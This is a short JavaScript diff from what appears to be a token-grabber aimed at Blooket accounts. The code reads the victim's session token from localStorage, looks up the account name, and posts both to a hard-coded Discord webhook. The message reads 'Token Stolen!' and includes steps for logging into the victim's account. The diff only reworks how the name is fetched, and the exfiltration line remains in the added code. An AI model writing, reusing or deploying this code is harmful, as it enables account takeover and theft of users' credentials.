@@ -18,4 +18,5 @@ function fetchApi(url, json, method){
   	console.error(error)
   })
 }
-fetchApi('https://discord.com/api/webhooks/903749854013051010/F3t98zHr2agCx4XAiRACLpxeqdnohqsXCoPcgPKTip61cky5MUPNhCituqYnan1JuByI',{content: await getName(myToken)+"'s Token Stolen!\n"+localStorage.token+"\nLog into account with: localStorage.token = '"+localStorage.token+"'\nhttps://www.blooket.com/stats?name="+await getName(myToken)},'post')
+var name = await getName(localStorage.token.split(' ')[1])
+fetchApi('https://discord.com/api/webhooks/903749854013051010/F3t98zHr2agCx4XAiRACLpxeqdnohqsXCoPcgPKTip61cky5MUPNhCituqYnan1JuByI',{content: name+"'s Token Stolen!\n"+localStorage.token+"\nLog into account with: localStorage.token = '"+localStorage.token+"'\nhttps://www.blooket.com/stats?name="+name},'post')
